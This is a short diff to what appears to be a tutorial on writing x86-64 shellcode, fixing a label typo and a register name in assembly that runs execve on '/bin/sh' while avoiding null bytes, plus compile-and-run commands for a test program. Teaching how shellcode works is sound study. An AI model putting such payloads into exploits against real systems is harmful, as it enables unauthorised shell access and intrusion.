@@ -58,7 +58,7 @@ Shellcode v2:
 ```asm
 .data
 .globl shellcode
-shellcode;
+shellcode:
     jmp over_string
 string_addr:
     .ascii  "/bin/shNAAAAAAAABBBBBBBB"
@@ -68,7 +68,7 @@ over_string:
     movb %al, 0x07(%rdi)
     movq %rdi, 0x08(%rdi)
     movq %rax, 0x10(%rdi)           ; use %rax, avoiding explicit 0
-    leaq 0x08(%rdi), %ri
+    leaq 0x08(%rdi), %rsi
     movq %rax, %rdx                 ; use %rax, avoiding explicit 0
     movb $0x3b, %al                 ; byte reg, upper bytes all zero
     syscall
@@ -94,5 +94,3 @@ Compile and run:
 cc -o shellcode-test shellcode-test.c shellcode.s
 ./shellcode-test
 ```
-
-
